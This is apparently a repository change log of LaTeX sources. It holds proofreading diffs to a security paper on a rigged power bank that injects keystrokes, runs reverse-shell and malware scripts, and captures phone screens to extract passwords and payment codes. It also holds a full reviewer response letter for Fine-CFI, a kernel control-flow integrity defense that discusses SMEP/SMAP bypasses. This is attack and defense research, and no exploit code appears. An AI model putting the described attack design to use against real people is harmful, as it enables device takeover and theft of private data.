 be obtained in Section~\ref{sec:experiment}.
 
-The advantage of this mode is that it achieves defense bypass and attack
+The advantage of this mode is that it achieves attack
 feedback with video streaming.

### 2021-03-12 WOOT/Files/experiment.tex
proofreading done

@@
 UGREEN~\cite{ugreen}, which supports HDMI, \ac{USB} 2.0, and many other exported peripherals.
-Apart from these essential parts, we also use an auxiliary power-bank to
+Apart from these essential parts, we also use an auxiliary power bank to
 provide power for the Raspberry Pi and the mobile devices used by the victim.
@@
 In the experiment of HID emulator mode, we used {Lenovo Xiaoxin Pro 13
-2020}, a PC in Windows 10 (OS Build 18363.1379) with two \ac{USB} Type-C interfaces as the
+2020}, a PC in Windows 10 \mbox{(OS Build 18363.1379)} with two \ac{USB} Type-C interfaces as the
 target device.
 During this experiment, \tool disguised itself as a normal keyboard and an external screen as feedback channel.
-When first plugged in, the victim's devices raise a pop-up window asking victims what mode should the new screen be set to.
-\tool immediately injects a sequence of mouse movements and clicks to set itself as a mirror to the primary monitor.
-Thus we have successfully completed the attack initialization.
+When first plugged in, the victim's devices raised a pop-up window asking victims what mode should the new screen be set to.
+\tool immediately injected a sequence of mouse movements and clicks to set itself as a mirror to the primary monitor.
+Thus we had successfully completed the attack initialization.
 Then we tested three scripts, ranging from reverse shell backdoor to malware payload execution, all of which resulted in success.
@@
 During the experiment of privacy extraction via our video capture mode, we chose \textit{HUAWEI P30 (ELE-AL00)}, a
-smartphone in EMUI 11.0.0.135(C00E128R2P5) (Android 10.0 based) with a \ac{USB} Type-C interface, as the
+smartphone in EMUI 11.0.0.135(C00E128R2P5) \mbox{(Android 10.0 based)} with a \ac{USB} Type-C interface, as the
 target device.  In the privacy extraction experiment, \tool passively captured video
@@
 personal information. We also tested the payment code extractor, which enables
-an attacker to identify payment code in the video stream and perform transactions
+an attacker to identify payment code in the video stream and performs transactions
 without the password. As this is also a part of our case study, more details about
@@
 Note that the video capture mode only needs to
-process the victim's video stream locally, it does not need to transmit the real-time video back to the attacker, which is needed when the network connection between \tool and the attacker is not stable.
+process the victim's video stream locally, it does not need to transmit the real-time video back to the attacker, which is useful when the network connection between \tool and the attacker is not stable.
 %This mode is useful when there is no stable network connection between \tool and the attacker.
@@
 
-Sharing power banks not only provide convenience to users, but also bring security issues.  We noticed that most of the power bank stations do not
+Sharing power banks not only provides convenience to users, but also brings security issues.  We noticed that most of the power bank stations do not
 check the integrity of power banks during the rental process, and users are
@@
 	\item A user borrows the modified power bank and connects it to his/her own device, becoming the victim of \tool.
-	\item The attacker now has complete control over the victim and can perform various attacks using different modes.
+	\item The attacker now has complete control over the victim's device and can perform various attacks using different modes.
 \end{enumerate}
@@
 %\hongyi{Better way to express this?}
-First, under \ac{HID} emulator mode, the attacker is able to implant malware and backdoor script into victims' devices.
+First, under \ac{HID} emulator mode, the attacker is able to implant malware and backdoor scripts into victims' devices.
 Moreover, using video capture mode, once the victims access their sensitive data such as QR payment  code or photos, their sensitive data will be immediately transmitted via \tool to the attacker.
@@
 This protects their privacy and is also a mark for us to confirm that the data we find contains their private data.
-At last, he/she would destroy all original files, leave only the desensitized \ac{OCR} result for us.
+At last, he/she would destroy all original files, leave only the desensitized \ac{OCR} results for us.
 %\shuqing{Do we need to mention that agreement the conference required here?}

### 2021-03-12 WOOT/Files/experiment.tex
remove nonsense

@@
 
-After collecting the captured videos of the mobile phone, we analyzed the videos both automatically and manually.
+After collecting the captured videos of the mobile phone, we analyzed the videos automatically.
 During the automatic analysis, we used scripts to perform \ac{OCR} recognition for each frame in the recorded videos and stored all of the \ac{OCR} results in a database.
@@
 %\shuqing{Statistics.}
-The frame number is the position of this frame in the recorded video, which indicates a target for manual analysis for further data extraction.
 At last, we found 4,172 of 94,058 records obtained by \tool which are related to privacy information, as shown in the Table~\ref{table:information_extracted}.
-
-In the manual analysis, we replayed the videos and extracted sensitive information.
-Accounts of internet applications such as Apple, iCloud, Facebook, Twitter can be obtained.
-Moreover, all of the typing inputs on the virtual keyboard, including the system keyboard and the built-in security keyboards of the financial applications, can be clearly recorded.
-We can obtain the plain text of passwords such as WiFi passwords.
-Furthermore, the received SMS verification code (usually used to confirm real-name authentication) can be obtained when it appears in the top notification bar.
 

### 2021-03-12 response_letter/response-letter.tex

\documentclass[oneside, 11pt]{article}
\usepackage{times,fullpage,indentfirst,graphicx,setspace,subfigure,epsfig,wasysym,url,hyperref}
\usepackage{booktabs}
\usepackage{appendix}
\usepackage{multirow}
\usepackage{longtable}
\usepackage{graphicx}
\usepackage{array}
%\usepackage{ulem}

\topmargin -0.17in

\hoffset -0.1in

\textwidth 6.6in

\oddsidemargin 0.1in

\textheight 9.2in

\newenvironment{cvl}{\begin{list}{$\bullet$}{
\setlength{\leftmargin}{0.3in} \setlength{\labelsep}{0.07in}
\setlength{\labelwidth}{0.17in} \setlength{\rightmargin}{0.0in}
\setlength{\topsep}{0.000in} \setlength{\partopsep}{0.000in}
\setlength{\parskip}{0.000in} \setlength{\parsep}{0.005in}
\setlength{\itemsep}{0.005in}}}{\end{list}}

\begin{document}

\setcounter{page}{1}
%\pagestyle{empty}

\newcommand{\TheName}{\textsc{Fine-CFI}}

\title{Response to Reviewers on ``\TheName{}: Fine-grained Control-Flow
Integrity for Operating System Kernels''}

\author{Jinku Li, Xiaomeng Tong, Fengwei Zhang, and Jianfeng Ma \\
\\
\vspace{0.2in}
\begin{small}
\begin{tabular}{cc}
jkli@xidian.edu.cn, txmxidian@gmail.com, fengwei@wayne.edu, jfma@mail.xidian.edu.cn\\
\end{tabular}
\end{small}
}

\date{}
\maketitle

%%\doublespacing
%\renewcommand{\baselinestretch}{1.8}
%%\baselineskip{8mm}
%\bibliographystyle{plain}
%
%\end{spacing}
%%\vspace{-5mm}

We would like to deeply thank the anonymous reviewers and the Associate
Editor for their timely, constructive comments. Your reviews provide
valuable and unique insight that we have taken into great consideration
to make this revision possible. In this document, please find our summarized
revisions as well as detailed response to the reviewers' comments.

\section{Revision Summary}
Based on the reviews' comments, we have made major revisions in the
following three aspects. And we have also uploaded a PDF \textbf{diff} file to the
ScholarOne system for the reviewers.

\begin{itemize}

\item %\smallskip
\noindent
First, we have modified the prototype of \TheName{} to prevent attacks by
corrupting only the CS in the interrupt context.

In the new prototype,
we provide protection for the CS as well as the IP in the context information
when an interrupt occurs. To this end, we need to instrument the \emph{iret}
instruction to verify the CS/IP pair for the interrupt return. Specifically,
we insert seven instructions before \emph{iret} instruction
in function \emph{irq\_return()}. We use two \emph{mov} instructions
(i.e., \emph{mov 0x10(\%rsp),\%r12} and \emph{mov 0x18(\%rsp),\%r13}) to dump
the CS/IP pair in current VM kernel stack (in \emph{0x10(\%rsp)} and \emph{0x18(\%rsp)})
into \emph{\%r12} and \emph{\%r13} registers, which are pre-pushed into the
stack (with \emph{push \%r12} and \emph{push \%r13}) for later restoring
(with \emph{pop \%r13} and \emph{pop \%r12}). After that, a \emph{vmcall}
instruction is executed to exit from the VM and enter the hypervisor, so that
we can verify the dumped data in \emph{\%r12} and \emph{\%r13} registers.
A new instrumentation example for interrupts is shown in
Figure 5 (see Section III.C, pp.9).

We have re-evaluated the performance for the new prototype, and the
results show that the overhead is less than $10$\% on average.
The details can be found in Section IV.B, pp.11-13.

\item %\smallskip
Second, the evaluation has been greatly expanded in the revision.

In the security evaluation of our system, we have figured out the
remaining gadgets in the original and instrumented Linux kernel
using the open-source tool ROPgadget. As a result, ROPgadget found
44,063 gadgets in the original Linux kernel and 841 gadgets in the
instrumented Linux kernel. We checked all these 841 gadgets and
confirmed that none of them can be reached through a control flow
which is allowed by our fine-grained CFG. Therefore, none of these
gadgets could be leveraged to launch an effective ROP attack.
The details can be found in Section IV.A, pp.11.

In the performance evaluation of our system, we have introduced 3 new
tests to our system. (1) In order to further measure the
impact on real-world applications introduced by \TheName{}, we have
selected five representative real-world applications in Phoronix Test
Suite, i.e., compress-7zip, postmark, nginx, cachebench, and network-loopback,
which stand for the performance behaviors in processor, disk, system, memory,
and network, respectively, to evaluate the performance overhead of our system.
%(2) To further show an intuitive comparison with the user-level CFI implementations,
(2) To further demonstrate the performance overhead introduced by \TheName{},
we have implemented our approach to four benchmarks in SPEC CPU2006 benchmarking
suite, i.e., 401.bzip2, 403.gcc, 429.mcf, and 458.sjeng for evaluation.
(3) For the above C benchmark programs (i.e., 401.bzip2, 403.gcc, 429.mcf, and 458.sjeng),
we have also achieved the goal to break the results down by only instrumenting
indirect call/jmp (\emph{New-icall}) or call/ret (\emph{New-ret}) instructions, to
see the impact on the forward/backward edge protection.
The results show that the performance overhead is less than $10$\% on average.
The details can be found in Section IV.B, pp.11-13.

\item %\smallskip
Third, we have revised Section II.B carefully to address a few concerns raised by the reviewers.

(1) We have provided a formal definition of \emph{struct location vector}.
In particular, we define the \emph{struct location vector} of a function pointer
as the location of the function pointer member in a (nested) struct.
To better represent the cases in nested structs, we use the name of the
struct, the element's order number, and the nested member's order numbers
to reach the function pointer member in the struct to denote its
\emph{struct location vector} (see Section II.B, pp.4).

(2) We have introduced a more high-level description of our pointer
analysis with a basic worklist algorithm that does not require compiler
background knowledge to understand (see Algorithm 1, pp.4).
After that, to describe our algorithm more intuitively, we leverage a simple
example program to present the process to determine the point-to sets of
indirect function calls (see Figure 1 and 2, pp.5).

(3) We have made our main innovation clearer in the revision.
Specifically, the main innovation of our retrofitted point-to analysis is that
we introduce a new vector, called \emph{struct location vector}, to infer the
targets for indirect function calls. This is reasonable as we observe that
there are a large number of function pointer initializations and assignments inside
struct variables in kernel space, and the function pointer locates in the
same field of the struct in its lifetime, i.e., from the initialization or assignment to
be consumed by indirect function calls. Combining \emph{struct location vector}
with function signature-based policy, it largely reduces the number of targets
of indirect call/jmp instructions -- average 13.14 for each indirect call/jmp
instruction (see Section II.B, pp.4).

\end{itemize}

\smallskip
Next, we present our detailed response to individual reviewer's comments.

\section{Response to Reviewer One}

\noindent {\bf This paper proposes a novel CFI (Control Flow Integrity)
approach for operating system kernels, named \TheName{}. \TheName{} uses a
static analysis approach to determine a fine-grained CFG (Control Flow
Graph) of the kernel, then enforces control flow to stay within that CFG.
Moreover, it offers a hypervisor-based protection against corruption
of interrupt context data.

The work is certainly of good quality. Most importantly, it combines fine
granularity with low overhead, which is a significant improvement over
previous work.}

{\em Authors response:}
Thanks for the summary and favorable comments.

\smallskip
\smallskip
\smallskip
\noindent {\bf However, there is a major issue that needs to be addressed.
Through the paper, the authors state that the hypervisor-based protection
covers the CS/IP pair in the interrupt context. However, the final prototype
only covers IP (and this is indicated in just a footnote).
Moreover, not protecting CS can have a serious security impact: it can
allow an attacker to return from an interrupt to user code (IP, not
corrupted) with kernel privileges (by corrupting the CPL in CS).
This clearly only applies when SMEP is not present, but \TheName{} makes
no assumptions on SMEP. Since leaving CS unprotected has an actual impact,
I believe the prototype should be modified to include it and the performance
re-evaluated. Evaluation of the main CFI mechanism is not affected.}

{\em Authors response:}
Thank you very much for the great comments! We have followed your suggestion
and modified the prototype to prevent attacks by corrupting only the
CS. In the new prototype, we provide protection for the CS as well as the IP.
To achieve that, we need to instrument the \emph{iret} instruction to
verify the CS/IP pair for the interrupt return. Specifically,
we insert seven instructions before \emph{iret} instruction
in function \emph{irq\_return()}. We use two \emph{mov} instructions
(i.e., \emph{mov 0x10(\%rsp),\%r12} and \emph{mov 0x18(\%rsp),\%r13}) to dump
the CS/IP pair in current VM kernel stack (in \emph{0x10(\%rsp)} and \emph{0x18(\%rsp)})
into \emph{\%r12} and \emph{\%r13} registers, which are pre-pushed into the
stack (with \emph{push \%r12} and \emph{push \%r13}) for later restoring
(with \emph{pop \%r13} and \emph{pop \%r12}). After that, a \emph{vmcall}
instruction is executed to exit from the VM and enter the hypervisor, so that
we can verify the dumped data in \emph{\%r12} and \emph{\%r13} registers.
A new instrumentation example for interrupts is shown in
Figure 5 (see Section III.C, pp.9).

We have re-evaluated the performance for the new prototype, and the
results show that the overhead is less than $10$\% on average.
As well, we have introduced several other benchmarks to make further
evaluation for our system. The details can be found in Section IV.B, pp.11-13.

%Thank you very much for the constructive comments. After your explanation,we
%realize that it is a big mistake to leave CS unprotected. As a result, we rebuild
%the entire system to make sure CS is protected including the instrumentation for
%dumping CS before iret in guest kernel and the backup/verification of CS in KVM.
%We have revised it in the revision (see Section III.C,pp.9). Then, we re-evaluate
%the performance for the whole system and the result shows that the overhead
%is acceptable. At the same time, we have introduced other benchmark tests to
%make the evaluation of performance more accurately (see Section IV.B,pp.10-11).

\smallskip
\smallskip
\smallskip
\noindent {\bf There are also other improvements I would like to see:}

\noindent {\bf 1) Expand and clarify on ret2usr attacks. The classic ret2usr involves
corrupting non-interrupt control data (e.g., a kernel function pointer),
and kernel CFI mitigates it. The kind of ret2usr that requires hypervisor
protection involves corrupting the interrupt context and is not covered
by the provided reference ([25]). I would also appreciate if you touched
upon SMEP and SMAP, as they are effective hardware countermeasures to
classic ret2usr. }

{\em Authors response:}
Thanks for your suggestion. We have made expansion and clarification on the
two kinds of ret2usr attack in the revision (see Section I, pp.2).
As pointed out by you, the classic ret2usr attacks only corrupt
non-interrupt (usual) control data in kernel space, e.g., a kernel function pointer
or return address. However, the novel ret2usr attacks could corrupt IP and CS
in the interrupt context to transfer execution control-flow to the user-space code
controlled by attackers with kernel privileges. As a result, we also need to
provide protection for the control data in the
interrupt context, as well as the usual control data in kernel space.

At the same time, in the revision, we have presented several feasible
attacks to bypass SMEP/SMAP, and explained why all of them can be defeated by
\TheName{} (see Section IV.A, pp.11).
Specifically, it has been showed that SMEP/SMAP could be bypassed with kernel code-reuse
attacks, although they are effective hardware countermeasures to classic ret2usr attacks.
Popov provides a method to bypass SMEP by tampering the function pointer with
kernel function \emph{native\_write\_cr4()} and passing a controlled argument with
the bit 20 of CR4 register cleared to disable it [1].
Nikolenko shows another trick to disable SMEP by combining several useful kernel gadgets
and pivoting the stack for clearing the bit, or bypass SMAP by abusing vDSO [2].
However, \TheName{} prevents both the kernel code-reuse attacks and the ret2usr attacks,
by providing fine-grained CFI protection and the control data protection in the interrupt context.
Thus, \TheName{} is immune to the above attacks.

% FIXME: a comment, why do we add "here" at the end of the references? is there any purticular reason?
[1] ``Cve-2017-2636: exploit the race condition in the n\_hdlc linux kernel driver bypassing smep.''\\
https://a13xp0p0v.github.io/2017/03/24/CVE-2017-2636.html.

[2] ``Practical smep/smap bypass techniques on linux.''\\
http://www.syscan360.org/slides/2016\_SG\_Vitaly\_Nikolenko\_Practical\_SMEP\_Bypass\_Techniques.pdf.
%(\%20 and \_)

%However, our fine-grained CFI enforcement and hypervisor-based protection not only
%effectively prevent ret2usr attacks, but also effectively prevent kernel code-reuse attacks,
%as we have eliminated all the usable gadgets by limiting the control flow in the fine-grained CFG
%and verified all the interrupt control data.

%Thanks for your suggestion. We have expanded and described the two kinds of
%ret2usr attacks in  the revision (see Section I,pp.2). At the same time,
%we discussed the two existing feasible attacks for bypassing SMEP and
%explained why both of them can be defeated by our \TheName{} (see Section IV.A,pp.10).

\smallskip
\smallskip
\smallskip
\noindent {\bf 2) Clarify the instrumentation of direct calls. In Section
III.B the authors mention the replacement of 50,677 direct calls. Why are
they replaced, when the integrity of kernel code is assumed in Section II.A? }

{\em Authors response:}
Indeed, the reason why it instruments direct call instructions is due to
the adoption of \emph{indexed hooks} approach to enforce CFI protection.

Specifically, based on the observation that existing control data (e.g.,
function pointers or return addresses) have a set of legitimate jump targets,
\emph{indexed hooks} precalculates them into (protected) jump tables and then replaces
these control data with their indexes to these tables.
Note that the jump tables are read-only and thus can be protected with
the hardware-based page-level protection.
For each ret instruction, its jump table (i.e., return table) contains all the return
addresses it may return to according to the CFG. With that, \emph{indexed hooks} leverages
the extended compiler \emph{LLVM} to instrument all the return address-related instructions by replacing the
return address with a return table index. In the high level, to provide protection for
return addresses, a ``call dst'' instruction is instrumented into ``push \$ret\_table\_index; jmp dst'',
and a ``ret'' instruction is instrumented into ``pop \%reg; jmp *RetTable(\%reg)''.
We have made clarification in the revision (see Section III.B, pp.8).

%Thanks a lot. A ret instruction will transfer the control flow to the instruction that
%immediately follows a just executed call instruction, whatever it is a
%direct call or a indirect call. As a result, as we instrument all ret
%instructions, any call instruction must be replaced to push the index
%rather than the real return address on stack. In other words, the direct
%call instruction also needs to be instrumented. The description can be
%found in Section III.B,pp.8.

\smallskip
\smallskip
\smallskip
\noindent {\bf 3) Explicitly mention the performance numbers for other
kernel CFI implementations when comparing them to \TheName{}, as not all
readers are familiar with them. }

{\em Authors response:}
Thanks for your suggestion. In the revision, we have explicitly compared the
performance overhead of KCoFI and [1] to \TheName{}. The results indicate
that the performance overhead of \TheName{} is smaller than the other two
systems (see Section IV.B, pp.11-12).

Specifically, in the Phoronix Test Suite, for postmark benchmark which is used
to measure the file system performance, \TheName{} only incurs $7.69$\%
overhead while KCoFI incurs $1.96$x on average. At the same time, in the evaluation
results of LMbench, \TheName{}'s maximum overhead for fork+exit operation is
only $11.05$\% while KCoFI incurs $3.50$x overhead on average.
On the other hand, in the evaluation results of UnixBench, \TheName{}
incurs $7.20$\% overhead for a Linux kernel, while [1] incurs $11.91$\% overhead
for a FreeBSD kernel.

[1] X. Ge, N. Talele, M. Payer, and T. Jaeger, ``Fine-grained control-flow
integrity for kernel software,'' in Security and Privacy (EuroS\&P), 2016 IEEE
European Symposium on, pp.179-194, IEEE, 2016.

%Thanks for your suggestion. We have explicitly figured out the performance
%overheads for other kernel CFI implementations when comparing them to our
%\TheName{} (see Section IV.B,pp.11).

\smallskip
\smallskip
\smallskip
\noindent {\bf 4) Define the struct location vector more formally.
Right now it is defined through examples, and while it can be understood
it would be better to have an explicit definition of it, especially
because there can be multiple indexes for nested fields, which is not
immediately clear from Section II.B.}

{\em Authors response:}
Thanks for your suggestion. In the revision, we have provided the formal
definition of \emph{struct location vector} (see Section II.B, pp.4).
In particular, we define the \emph{struct location vector} of a function pointer
as the location of the function pointer member in a (nested) struct.

To better represent the cases in nested structs, we use the name of the
struct, the element's order number, and the nested member's order numbers
to reach the function pointer member in the struct to denote its
\emph{struct location vector}. Thus, the \emph{struct location vector} of a
function pointer is denoted as
\emph{(\%struct.name, ele\_order, mem\_order\_$1$, ... , mem\_order\_$i$, ...)}
(\emph{ele\_order} denotes the element' order number in a \emph{\%strut.name}\_typed
array, and \emph{mem\_order\_$i$} denotes the member's order number of layer
\emph{$i$} in \emph{\%struct.name} struct to reach the function pointer; $i$$>=1$).
For example, vector \emph{(\%struct.sb,$0$,$2$)} denotes that a function pointer
locates at the \emph{$2$nd} member of layer $1$ in a \emph{\%struc.sb} struct, which
is the \emph{$0$th} element in a \emph{\%struct.sb}-typed array.

%\begin{itemize}
%\item (\%struct.name, X, i, j, k, ...), respectively denotes the name of struct type,
%the Xth element in a struct array, the ith member inside a \%struct.name-typed
%variable, the jth member inside a \%struct.name\_i-typed variable, the kth
%member inside a \%struct.name\_j-typed variable and so on.
%\end{itemize}

\smallskip
\smallskip
\smallskip
\noindent {\bf 5) In Figure 1(b), there seems to be an omission that
is not indicated: the initialization (presumably from a stack allocation)
of \%1 and \%2 is not present. While not relevant for the analysis,
the omission should be indicated. }

{\em Authors response:}
Thanks a lot for your correction. We have indicated the omission in the revision
(see Section II.B, pp.4).
%as following:
%\begin{itemize}
%\item (we omit some irrelevant content due to space limitation,
%such as the temporary variables \%1 and \%2 which are from stack allocation).
%\end{itemize}
As you pointed out, \%1 and \%2 are indeed two temporary
variables from stack allocation and we omit them.

\smallskip
\smallskip
\smallskip
\noindent {\bf 6) Proofread the paper more thoroughly, as there are
several grammatical mistakes and non-idiomatic wordings. There is
also a typo in Section III.A: ``[...] \%18 has been cas(T)ed from [...]''. }

{\em Authors response:}
Thanks for your correction and suggestion. We have corrected the typo in the
revision. And we have reviewed the revision carefully several times and fixed
some mistakes.

\smallskip
\smallskip
\smallskip
\noindent {\bf As a final note, the hypervisor-based protection
actually does more than thwarting ret2usr attacks. It also protects
against kernel code reuse, which is a common SMEP bypass.}

{\em Authors response:}
Thanks for your information. We agree with your opinion. Indeed, in the revision,
we have leveraged several SMEP/SMAP bypass attacks to clarify that our
hypervisor-based protection can also protect against kernel code-reuse
attacks (see Section IV.A, pp.11).

%Thanks for your note, we have used two examples about SMEP bypass attacks
%to clarify that our hypervisor-based protection can also protect against
%kernel code-reuse attack (see Section IV.A,pp.10).

\section{Response to Reviewer Two}

\noindent {\bf Strengths:

- Prototype implementation

- Good performance\\
Weaknesses:

- Contribution not clear

- Explanation of the idea requires revision

- Security analysis not convincing }

{\em Authors response:}
Thanks for the summary. We will respond to your concerns in the following.

\smallskip
\smallskip
\smallskip
\noindent {\bf Modern kernels are written in unsafe languages like
C/C++, and prone to memory corruption vulnerabilities. Attackers
exploit these vulnerabilities to overwrite code pointers, which
are afterwards used by the application, to hijack the control
flow, and get full control of the system. One prominent defense
against control-flow hijacking attacks is control-flow integrity
(CFI) which verifies each code pointer before it is used as a branch
target. This paper presents the design and implementation of CFI
for operating system kernels, called \TheName{}. In contrast to user
mode CFI, kernel CFI comes with additional challenges as the kernel
makes heavy use of single code pointers in various data structures.

In general, the presented design makes a solid impression.
\TheName{} is a compiler extension that instruments the kernel to enforce
CFI checks before each indirect branch. Further, \TheName{} utilizes a
trusted hypervisor to protect the context data of interrupts. This is
important because the interrupt context contains the saved instruction
pointer. The performance evaluation indicates an acceptable average
performance overhead of less than 5\%. }

{\em Authors response:}
Thanks for the summary and comments.

\smallskip
\smallskip
\smallskip
\noindent {\bf The main issue of the paper is that all the previous
described design of \TheName{} is a retrofitted version of the authors
previous work `Comprehensive and efficient protection of kernel control
data' [27]. Hence, it is a bit confusing that large parts of the paper
are dedicated to explaining and evaluating this design. }

{\em Authors response:}
Thanks for your patience. We fully understand what you're confusing
and we do borrow the instrumentation scheme \emph{indexed hooks} in our
previous work `Comprehensive and efficient protection of kernel control
data'. However, as mentioned by you in the following, the main contribution
of this paper is that it leverages a retrofitted context-sensitive and
field-sensitive pointer analysis (rather than the dynamic profiling approach
in the previous work) which greatly improves the precision of
kernel CFG. Note that to enforce fine-grained CFI for an operating system
kernel, the key is to get a precise and fine-grained CFG of it.
After obtaining the fine-grained CFG, it is an intuitive thing to
enforce fine-grained CFI since there have been some fairly mature
solutions. We leverage \emph{indexed hooks} rather than the original label-based
approach as \emph{indexed hooks} solved the destination equivalence problem, which
could possibly lead to coarse-grained CFI.

We have made a further clarification in the revision (see Section VI, pp.14).

%Thank you for your patience. We fully understand what you're confusing
%and we do borrow the instrumentation scheme (i.e., indexed hooks) in our
%previous work `Comprehensive and efficient protection of kernel control
%data'. However, just like what we said in the paper (see Section I, pp.3) and
%you mentioned in the following, the main contribution of this paper lies in
%two aspects. One is the retrofitted context-sensitive and field-sensitive pointer
%analysis which greatly improves the precision of kernel CFG. Another is
%the effective hypervisor-based protection mechanism for interrupt context
%which verifies every interrupt control data including IP and CS in kernel
%stack. Combining both of them, \TheName{} can effectively defeat those
%formidable ret2usr and kernel code-reuse attacks.

\smallskip
\smallskip
\smallskip
\noindent {\bf The actual contribution of the paper is the difference
in inferring the policy that is enforced by CFI run-time checks.
The previous work [27] used a dynamic analysis while this paper uses
a compiler-based approach. In particular, this paper bases their policy
on function signatures (return type, number and type of arguments).
Unfortunately, this is a known technique and published [a] (slide 23)
which weakens the scientific contribution. However, this could be
compensated by providing a very strong evaluation and documentation.

[a] https://pax.grsecurity.net/docs/PaXTeam-H2HC15-RAP-RIP-ROP.pdf }

{\em Authors response:}
Thank you. We agree that the function signature-based policy is not
a novel idea, though it is not an easy task to implement
such a policy in a large code base.
Further, we want to clarify that our pointer analysis
approach is not merely based on function signatures. Indeed, to improve
the precision of the function pointer's point-to set, we introduce a new
vector, i.e., \emph{struct location vector}, to infer the targets for
indirect function invocations. We introduce such a vector as we observe
that there are a large number of function pointer initializations and assignments inside
struct variables in kernel space, and the function pointer
locates in the same field of the struct in its lifetime, i.e.,
from the initialization or assignment to be consumed by indirect function calls.
Combining \emph{struct location vector} with function signature-based policy,
it largely reduces the number of targets of indirect call/jmp instructions
(average $13.14$ for each indirect call/jmp instruction) (see Section II.B, pp.4).
Additionally, as you suggested in the following, we have
performed a further security evaluation using a ROPgadget tool to find and analyze
the remaining gadgets after our instrumentation, and the results show that none of these gadgets could
be used to launch an effective ROP attack (see Section IV.A, pp.11).
%our approach is able to prevent
%all ROP attacks (see Sectiion IV.A, pp.10).

%Thanks for your suggestion. In fact, our pointer analysis approach
%is not entirely based on function signatures which are just applied
%in very few cases (e.g., a function pointer is not from any field of
%any structure). Actually, our approach bases the struct location vector
%of a function pointer which is more precise than the simple function
%signatures, and largely reduces the number of targets of indirect call/jmp
%instructions (average 13.14 for each indirect call/jmp instruction).
%At the same time, we provided a more strong security evaluation using
%ROPgadget to find the remaining gadgets as you suggested, and the result
%shows that our pointer analysis is precise enough to prevent against all
%ROP attacks (see Section IV.A,pp10).

\smallskip
\smallskip
\smallskip
\noindent {\bf This leads to the second shortcoming of the paper.
The paper would greatly benefit from revising Section II.B. While
such a detailed explanation of the used techniques is desirable
for the implementation section, the authors should also include a
more high-level description of their technique that does not require
compiler background knowledge.}

{\em Authors response:}
Thank you very much and it is a good point. In the revision, we have followed
your suggestion and revised Section II.B carefully.

\emph{First}, we have provided a formal definition of \emph{struct location vector}.
In particular, we define the \emph{struct location vector} of a function pointer
as the location of the function pointer member in a (nested) struct.
To better represent the cases in nested structs, we use the name of the
struct, the element's order number, and the nested member's order numbers
to reach the function pointer member in the struct to denote its
\emph{struct location vector}. Thus, the \emph{struct location vector} of a
function pointer is denoted as
\emph{(\%struct.name, ele\_order, mem\_order\_$1$, ... , mem\_order\_$i$, ...)}
(\emph{ele\_order} denotes the element' order number in a \emph{\%strut.name}\_typed
array, and \emph{mem\_order\_$i$} denotes the member's order number of layer
\emph{$i$} in \emph{\%struct.name} struct to reach the function pointer; $i$$>=1$)
(see Section II.B, pp.4).

\emph{Second}, we have introduced a more high-level description of our pointer
analysis with a basic worklist algorithm that does not require compiler
background knowledge to understand (see Algorithm 1, pp.4).
After that, to describe our algorithm more intuitively, we leverage a simple
example program to present the process to determine the point-to sets of
indirect function calls (see Figure 1 and 2, pp.5).

\emph{Third}, we have further made our main conceptual ideas and innovations
clearer in the revision (see Section II.B, pp.4).

\smallskip
\smallskip
\smallskip
\noindent {\bf For a strong evaluation, there are couple of issues
which need to be addressed: }

\noindent {\bf 1) It was shown and the community agreed
that the AIR metric is not very useful [57]. Hence, the paper would
greatly benefit from an (semi-)automatic analysis of the remaining
attack surface which means looking at the remaining gadgets and if
they could be used in an attack. }

{\em Authors response:}
Thank you very much for the constructive comment.
Following your suggestion, we have figured out the remaining gadgets
in the original and instrumented Linux kernel using the open-source tool
ROPgadget. As a result, ROPgadget found $44,063$ gadgets in the original
Linux kernel and $841$ gadgets in the instrumented Linux kernel. We
checked all these $841$ gadgets and confirmed that none of them can be
reached through a control flow which is allowed by our fine-grained CFG.
Therefore, none of these gadgets could be leveraged to launch an effective ROP
attack (see Section IV.A, pp.11).

\smallskip
\smallskip
\smallskip
\noindent {\bf 2) The choice of benchmarking test is not always
clear: CPU heavy user mode benchmark (SPEC CPU) are expected to not
have any serious performance degradation when kernel CFI is applied.
Further, it is not clear how single arithmetic operations are meaningful
in this context. Could \TheName{} be applied to the SPECCPU benchmarks?}

{\em Authors response:}
Thanks for your comments. We also notice that it seems to be no
serious performance overhead on SPEC CPU benchmark when kernel CFI is
applied. To further measure the performance overhead imposed by our approach,
we have followed your suggestion and applied \TheName{} to four benchmarks
in SPEC CPU2006 benchmark suite, i.e., 401.bzip2, 403.gcc, 429.mcf, and 458.sjeng.
These benchmarks depend on the \emph{libc} library as well as some objects
in C runtime library (e.g., crt1.o, crti.o, crtn.o). To achieve that,
we need to instrument the benchmark programs as well as the dependencies.
%And each one depends on the \emph{libc} library and some
%default libraries in GCC (e.g., \emph{libgcc\_eh}) as well as some objects
%in C RunTime Library (e.g., crt1.o, crti.o, crtn.o). To achieve that, for each benchmark,
%we instrumented the program and all above dependent libraries/objects, and linked them together statically.
The evaluation results show that the performance overheads introduced by
401.bzip12, 403.gcc, 429.mcf, and 458.sjeng are $7.18$\%, $4.13$\%, $12.03$\%, and
$10.12$\%, respectively. The details can be found in Table V, pp.12.

On the other hand, it seems to be no any performance overhead on the arithmetic
operations in LMbench. The possible reason is that these operations might not
go through enough instrumented sites in the kernel. We have removed the
single arithmetic operations in LMbench evaluation in the revision (see Figure 8, pp.12).

\smallskip
\smallskip
\smallskip
\noindent {\bf How about testing the impact on real-world applications
with the help of the Phoronix benchmarking suite? }

{\em Authors response:}
Thanks for your suggestion. In the revision, we have selected five
representative real-world applications in the Phoronix Test Suite,
i.e., compress-7zip, postmark, nginx, cachebench, and network-loopback,
which stand for the performance behaviors in processor, disk, system, memory, and
network, respectively, to evaluate the performance overhead incurred by our
approach. The results show that the overhead is acceptable ($5.39$\% for \emph{New-f} and
$9.89$\% for \emph{New-f+i} on average, respectively). The details
can be found in Table II, pp.12.

\smallskip
\smallskip
\smallskip
\noindent {\bf Is it possible break the results further down to see
the impact on the forward/backward edge protection? }

{\em Authors response:}
This is a good point. As mentioned earlier, we have applied our CFI enforcement
to four benchmarks (i.e., 401.bzip2, 403.gcc, 429.mcf, and 458.sjeng) in the
SPEC CPU2006 benchmark suite. At the same time, we also achieve the goal to
break the results down by only instrumenting indirect call/jmp (\emph{New-icall}) or
call/ret (\emph{New-ret}) instructions, to see the impact on the forward/backward
edge protection. The results show that \emph{New-ret} incurs most of the
overhead ($7.33$\% on average) while \emph{New-icall} incurs very little ($0.96$\% on average),
and the sum overhead ($8.29$\%) incurred by (\emph{New-icall}) and (\emph{New-ret}) is
roughly equal to the overhead incurred by \emph{New-f} ($8.37$\%), which is reasonable.
